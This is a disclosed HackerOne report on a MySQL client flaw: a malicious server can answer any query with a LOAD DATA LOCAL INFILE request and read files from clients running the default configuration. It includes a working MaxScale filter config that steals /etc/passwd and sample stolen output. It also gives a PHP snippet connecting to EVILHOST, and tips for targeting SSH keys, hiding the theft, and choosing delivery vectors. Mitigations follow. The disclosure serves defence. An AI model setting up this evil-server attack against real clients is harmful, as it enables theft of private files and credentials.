# Malicious Server can force read any file on clients system with default configuration in MySQL Clients

## Report Details
- **Report ID**: 171593
- **URL**: https://hackerone.com/reports/171593
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-24T02:19:09.078Z
- **Disclosed**: 2019-11-12T23:49:28.674Z

## Reporter
- **Username**: tarq
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Although it is [documented](http://dev.mysql.com/doc/refman/5.7/en/load-data-local.html) that the default binary distributions of MySQL/MariaDB/Percona all seem to be compiled with allow local infile enabled, the warning is misleading.

> The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server's choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access.


While this is true, what is not stated is that the malicious server can reply with a request to load data to _any_ query, not just manipulating a legitimate `LOAD DATA LOCAL INFILE` request from the Client. A simple example of such an attack can be done using MaxScale as an evil proxy with the following configuration:

```
[EvilFilter]
type=filter
module=regexfilter
options=ignorecase
match=.*
replace=LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test.loot;
```

This will replace any incoming query with a LOAD DATA query that will be sent to the backend. Upon receiving this query the backend sends the [LOCAL_INFILE_REQUEST](https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request) packet which will be processed by the client.

### Example attack (MySQL CLI Client):
```
# Evil server:
MariaDB [(none)]> select * from test.loot;
Empty set (0.00 sec)

# Target server:
mysql -utest -h EVILHOST test

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 30985
Server version: 10.0.0 beta-2.0.0-maxscale

Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [test]>

# And now back on the evil server, note that no interaction was required on behalf of the target client beyond simply connecting:
MariaDB [(none)]> select * from test.loot LIMIT 5;
+-------------------------------------------------+
| line                                            |
+-------------------------------------------------+
| root:x:0:0:root:/root:/bin/bash                 |
| daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin |
| bin:x:2:2:bin:/bin:/usr/sbin/nologin            |
| sys:x:3:3:sys:/dev:/usr/sbin/nologin            |
| sync:x:4:65534:sync:/bin:/bin/sync              |
+-------------------------------------------------+
5 rows in set (0.00 sec)
````

The evil server can now read any file with the permissions of the client process permissions. If targeting a system administrator, this may include stealing bash histories or SSH private keys. You can also learn more information about your target by grabbing `/proc/self/environ`.


### Example Attack (php_mysqli + php_mysqlnd):

````
$mysqli = mysqli_connect('EVILHOST', 'test', null, 'test', 3306);
$result = mysqli_query($mysqli, "SELECT 1");
$result = mysqli_fetch_assoc($mysqli, $result);
````

### Other Clients

Other vulnerable clients include:

- php-mysql (without open basedir)
- php-mysqli (with and without php-mysqlnd)
- node-mysql
- any library using libmysql included in the binary distributions compiled with ENABLE_LOCAL_INFILE

### Potential Attack Vectors

- Installers for Wordpress, Drupal, vBulletin, etc
- Any applications that allow integration with remote MySQL servers (i.e Zapier, though they specifically aren't vulnerable)
- MITM attacks
- DNS Cache poisoning
- Domain/Type Squatting
- Exposed administration tools such as PHPMyAdmin, although you could just exeute the query yourself in that case :)
- Good ol' social engineering

### Improving the attack
- A smarter evil server could accept any username/password/database name as valid
- Evil server could take steps to hide the attack by manipulating the packets in the result
- Evil server could be changed to not show the table where the stolen information is stored (beyond only giving the attack user INSERT privileges, it could simply not tell the client about that table)


### Mitigation

- Use `local-infile=0` in the `[client]` section of your `/etc/my.cnf` or `~/.my.cnf`
- Make sure your clients are configured to unset that flag if they do not read from configuration files


### Why is this news if it's documented?

- The documentation does not explain the full scope of possible attacks and may lead people to believe they are safe if they never execute a LOAD DATA LOCAL INFILE query
- With an evil server, any query executed can trigger the payload as soon as the client processes the reply. Even if we do not control the queries coming from the application

#### Recommendations

- Insecure defaults should be removed and going forward a clear error message such as "You must use --local-infile in order to use this feature" should be used to guide those who depend on this features
- Tools such as mysqlimport keeping this default is acceptable, the mysql client should not
- Any client library implementations should disable this flag by default


All tests were done on:
- Debian 8
- CentOS 7 
- WHM/cPanel + EasyApache Builds on CentOS 7

With the latest packages available from their respective repos as well as the versions available from the MariaDB repos.

Only default configurations were used, there were no modifications to the configuration files on the target servers. 

## Attachments
No attachments
